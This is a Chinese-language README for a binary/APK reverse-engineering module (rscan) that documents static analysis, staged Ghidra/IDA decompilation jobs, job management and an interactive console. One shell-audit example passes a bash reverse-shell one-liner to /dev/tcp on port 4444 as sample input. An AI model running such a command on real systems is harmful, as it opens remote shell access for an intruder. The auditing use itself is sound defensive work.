# Reverse Module

`reverse` 模块用于二进制/APK 静态分析、受管反编译作业、作业追踪和交互式逆向控制台。

## 1. 能力概览

- 静态分析：ELF/PE/APK 基础信息、加固信号、可疑导入/字符串、简单恶意特征
- 受管反编译：统一 job 生命周期（创建/运行/日志/产物/健康检查）
- 分阶段逆向：`index -> function -> full`，优先避免大样本全量反编译
- 逆向脚本生成：Ghidra/IDA/GDB 脚本与插件
- 交互控制台：函数检索、xrefs/calls、符号/段/导入、快速 GDB 命令

## 2. 推荐工作流（分阶段）

推荐顺序：

1) 先分析样本属性
- `rscan reverse analyze --input ./sample.bin --output json`

2) 建立函数索引（轻量）
- `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode index --workspace ./reverse_ws --output json`

3) 针对目标函数按需反编译
- `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode function --function main --workspace ./reverse_ws --output json`

4) 仅在需要时做全量
- `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode full --workspace ./reverse_ws --output json`

说明：

- 当使用 Ghidra 且请求 `full` 时，超大文件会自动降级为 `index`（见环境变量章节）
- 这可以显著降低大体积样本的初始处理时间和资源消耗

## 3. CLI 常用命令

### 3.1 静态分析与审计

- 生成规则模板
  - `rscan reverse rules-template --out ./reverse_rules.yaml`
- 使用自定义规则分析
  - `rscan reverse analyze --input ./sample.bin --rules-file ./reverse_rules.yaml --output json`
- 恶意样本初筛
  - `rscan reverse malware-triage --input ./sample.bin --output json`
- Shell 文本审计
  - `rscan reverse shell-audit --input ./script.sh --output json`
  - `rscan reverse shell-audit --text "bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" --output json`

### 3.2 反编译计划与执行

- 生成执行计划（支持多引擎）
  - `rscan reverse decompile-plan --input ./sample.bin --engine ghidra --output json`
  - `rscan reverse decompile-plan --input ./sample.bin --engine ida --output json`
  - `rscan reverse decompile-plan --input ./sample.bin --engine objdump --output json`

- 执行受管反编译作业（推荐）
  - `rscan reverse decompile-run --input ./sample.bin --engine auto --mode index --workspace ./reverse_ws --output json`
  - `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode function --function main --workspace ./reverse_ws --output json`

- 批量执行
  - `rscan reverse decompile-batch --inputs ./a.bin --inputs ./b.bin --engine auto --mode index --workspace ./reverse_ws --parallel-jobs 4 --output json`

提示：当前受管 pseudocode 作业请优先使用 `auto|ghidra|ida`。

### 3.3 作业管理

- 列表/状态
  - `rscan reverse jobs --workspace ./reverse_ws --output json`
  - `rscan reverse job-status --job <job_id> --workspace ./reverse_ws --output json`
- 日志与产物
  - `rscan reverse job-logs --job <job_id> --workspace ./reverse_ws --stream both`
  - `rscan reverse job-artifacts --job <job_id> --workspace ./reverse_ws --output json`
- 结果查询
  - `rscan reverse job-functions --job <job_id> --workspace ./reverse_ws --output raw`
  - `rscan reverse job-show --job <job_id> --name main --workspace ./reverse_ws --output raw`
  - `rscan reverse job-search --job <job_id> --keyword crypto --workspace ./reverse_ws --output raw`
- 健康与清理
  - `rscan reverse job-doctor --job <job_id> --workspace ./reverse_ws --output json`
  - `rscan reverse job-clear --job <job_id> --workspace ./reverse_ws --output json`
  - `rscan reverse job-clear --all --workspace ./reverse_ws --output json`
  - `rscan reverse job-prune --keep 20 --workspace ./reverse_ws --output json`

### 3.4 后端和脚本生成

- 后端检测
  - `rscan reverse backend-status --output json`
- GDB/IDA/Ghidra 脚本
  - `rscan reverse gdb-plugin --out ./rscan_gdb_plugin.py`
  - `rscan reverse debug-script --input ./sample.bin --profile pwndbg --script-out ./debug.gdb`
  - `rscan reverse ida-script --out ./ida_export_pseudocode.py`
- `rscan reverse ghidra-script --out ./ghidra_export_pseudocode.java`
- `rscan reverse ghidra-index-script --out ./ghidra_export_index.java`
- `rscan reverse ghidra-function-script --out ./ghidra_export_function.java`

### Ghidra Headless（精简版）集成

如果你使用精简版 headless 运行时，可通过环境变量指定路径：

- `RSCAN_GHIDRA_HOME=/home/vr2050/ghidra_core_headless_x86_min`  
  自动选择 `run-headless.sh` 或 `support/analyzeHeadless`

- `RSCAN_GHIDRA_HEADLESS=/home/vr2050/ghidra_core_headless_x86_min/support/analyzeHeadless`  
  直接指定 headless 可执行文件

当前精简版仅保留 `x86/x64` 处理器与 Decompiler 相关模块。

运行时回退：

- 若 `RSCAN_GHIDRA_HOME`/`RSCAN_GHIDRA_HEADLESS` 指向的目录缺少 `Decompiler/Base/x86` 组件，将自动回退到系统 PATH 中的 `analyzeHeadless`。

CLI 也支持覆盖：

- `rscan reverse console --ghidra-home /home/vr2050/ghidra_core_headless_x86_min`

## 4. 交互控制台

启动：

- `rscan reverse console --input ./sample.bin --workspace ./reverse_ws`
- `rscan reverse console --input ./sample.bin --workspace ./reverse_ws --tui`

TUI 键位：

- `j/k` 或方向键：上下移动函数
- `h/l` 或方向键：左右切换焦点
- `b` 或 `Backspace`：返回左侧
- `n/p`：切换上/下一个已完成的作业
- `/`：过滤函数（按名称/地址/签名）
- `s`：搜索（伪代码/调用/外部引用）
- `c`：注释当前函数（持久化）
- `;`：注释当前伪代码行
- `C`：清除当前注释
- `PageUp/PageDown/Home/End`：快速滚动
- `x`：清空过滤/搜索
- `g`：跳转到函数（name/ea）
- `1..6`：切换右侧 Tab（伪代码/调用/Xrefs/外部引用/字符串/Asm）
- `Tab`：左右面板切换焦点
- `Enter`：在 Calls/Xrefs 面板中跳转到目标函数
- `:`：命令模式（`filter|grep|goto|find|search|index|reindex|refresh|job|note|note-line|decompile|tab`）
- `:index` 构建项目级索引（增量，仅新增 job）
- `:find <kw>` 基于 JSONL 索引搜索并跳转
- `:search <kw>` 基于 Tantivy 全文检索并跳转
- `:graph <calls|xrefs> <out> [job_id]` 导出调用/引用图
- `:note-line <n> <text>` 添加伪代码/汇编行注释（清除用 `:note-line <n> clear`）
- `d`：触发 decompile（参数由环境变量控制）
- `r`：刷新作业与函数
- `R`：刷新并重建索引
- `?`：显示快捷键提示
- `q`：退出

控制台内推荐：

1) `decompile` 默认走 `index`（轻量）
2) 用 `functions/search/show` 定位目标
3) 需要函数体时执行 `function` 模式
4) 仅在必要时使用 `full`

核心命令：

- `decompile|run <auto|ghidra|ida|r2|jadx> [workspace] [timeout_secs] [index|full|function] [name_or_ea]`
- `pseudocode <auto|ghidra|ida> [out_dir] [index|full|function] [name_or_ea]`
- `jobs`
- `functions [job_id] [limit]`
- `show <function_name_or_ea> [job_id]`
- `search <keyword> [job_id]`
- `calls <function_name_or_ea> [job_id] [json]`
- `xrefs <function_name_or_ea> [job_id] [json]`

辅助命令：

- `sections [json]` / `imports [json]` / `symbols [pattern] [limit] [json]`
- `hexdump <offset_hex_or_dec> [len]`
- `strings [pattern] [limit]`
- `job-doctor [job_id]`
- `prune-jobs [keep_count|keep=N] [days=N] [running]`
- `delete <job_id>` / `open <job_id>`

## 5. 大文件优化（Ghidra）

环境变量：

- `RSCAN_GHIDRA_AUTO_INDEX_MB=50`
  - 把自动降级阈值设为 50MB
- `RSCAN_GHIDRA_AUTO_INDEX_MB=0`

额外性能开关（可选）：

- `RSCAN_GHIDRA_DECOMP_TIMEOUT_SEC=10`  
  缩短单函数反编译超时（默认 20 秒），可显著加速大样本全量导出，但可能牺牲部分函数结果。

- `RSCAN_GHIDRA_SKIP_IF_EXISTS=1`  
  若输出文件已存在且非空，则跳过本次导出（适合重复执行/重跑场景）。

- `RSCAN_GHIDRA_INCREMENTAL=1`  
  启用增量导出，已导出的函数会被跳过，结果会追加写入 JSONL（适合断点续跑与批量扩展）。

- `RSCAN_GHIDRA_MAX_FUNC_SIZE=800`  
  跳过超过指定地址数的函数（函数体过大时反编译耗时极高）。

- `RSCAN_GHIDRA_ONLY_NAMED=1`  
  跳过默认命名函数（`FUN_`/`sub_`），优先导出有意义命名的函数。

- `RSCAN_GHIDRA_ASM_LIMIT=2000`  
  限制每个函数导出的汇编行数（默认 4000），减少超大函数耗时。

- `RSCAN_GHIDRA_SKIP_ASM=1`  
  跳过汇编导出，仅保留伪代码。

Ghidra 项目缓存（大幅提升重复分析速度）：

- 默认启用项目缓存与复用（无需设置环境变量）。
- `RSCAN_GHIDRA_PROJECT_CACHE=0`  
  关闭项目缓存（恢复每次创建独立工程）。

- `RSCAN_GHIDRA_PROJECT_ROOT=/path/to/cache`  
  指定缓存工程目录；建议放在高速磁盘。

- `RSCAN_GHIDRA_REUSE_PROJECT=0`  
  禁用复用（强制重新导入）。

- `RSCAN_GHIDRA_NO_ANALYSIS=1`  
  不执行自动分析（仅适合你已做过分析并复用工程的情况）。
  - 关闭自动降级

默认行为：

- 未设置时阈值为 `25MB`
- 当 `--mode full` 且样本超过阈值时，自动切到 `index`
- job 元数据里的 `mode`/`note` 会记录实际生效模式与切换原因

## 6. 产物目录结构

以 `--workspace ./reverse_ws` 为例：

- `reverse_ws/jobs/<job_id>/meta.json`
- `reverse_ws/jobs/<job_id>/stdout.log`
- `reverse_ws/jobs/<job_id>/stderr.log`
- `reverse_ws/reverse_out/<job_id>/index.jsonl | function.jsonl | pseudocode.jsonl`

## 7. 常见问题

- Q: 为什么作业成功但 `full` 结果没有生成全量 pseudocode？
- A: 可能命中大文件自动降级，查看 `job-status` 返回里的 `mode` 与 `note`。

- Q: 怎么快速看某个函数？
- A: 先 `mode index` 建索引，再 `mode function --function <name_or_ea>`。

- Q: 控制台太慢怎么办？
- A: 避免直接 `full`，优先 `index` + `function`。
